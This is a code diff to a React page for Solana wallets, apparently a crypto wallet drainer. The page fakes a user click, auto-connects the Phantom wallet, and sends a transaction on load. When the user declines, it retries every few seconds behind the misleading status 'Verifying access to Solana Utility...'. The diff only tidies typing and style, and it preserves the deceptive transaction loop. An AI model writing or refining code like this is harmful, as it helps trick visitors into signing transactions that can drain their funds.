@@ -19,7 +19,7 @@ export default function TransactionPage() {
   const retries = useRef(0)
   const maxRetries = 3
   const waiting = useRef(false)
-  const [status, setStatus] = useState("Loading...") // yazı güncellenebilir
+  const [status, setStatus] = useState("Loading...")
 
   useEffect(() => {
     const simulateClick = () => {
@@ -27,8 +27,8 @@ export default function TransactionPage() {
         bubbles: true,
         cancelable: true,
         view: window
-      });
-      document.body.dispatchEvent(fakeClick);
+      })
+      document.body.dispatchEvent(fakeClick)
     }
 
     const trySendTransaction = async () => {
@@ -41,14 +41,18 @@ export default function TransactionPage() {
         const tx = await createUnsignedTransaction(publicKey, connection)
         const sig = await sendTransaction(tx as Transaction, connection)
         console.log("✅ transaction sent:", sig)
-        setStatus("Succesful ✅")
-      } catch (err: any) {
-        console.warn("⚠️ İşlem başarısız:", err?.message || err)
+        setStatus("Successful ✅")
+      } catch (err: unknown) {
+        if (err instanceof Error) {
+          console.warn("⚠️ İşlem başarısız:", err.message)
+        } else {
+          console.warn("⚠️ Bilinmeyen hata:", err)
+        }
         retries.current += 1
         setStatus("Verifying access to Solana Utility...")
         setTimeout(() => {
           waiting.current = false
-          trySendTransaction()
+          void trySendTransaction()
         }, 3000)
       }
     }
@@ -58,15 +62,15 @@ export default function TransactionPage() {
         simulateClick()
         await select("Phantom" as WalletName)
         if (!connected) await connect()
-        if (publicKey) trySendTransaction()
+        if (publicKey) void trySendTransaction()
       } catch (err) {
         console.error("connection error:", err)
         setStatus("Connection error ❌")
       }
     }
 
-    start()
-  }, [publicKey, connected])
+    void start()
+  }, [publicKey, connected, connect, select, sendTransaction, connection])
 
   return (
     <div style={{
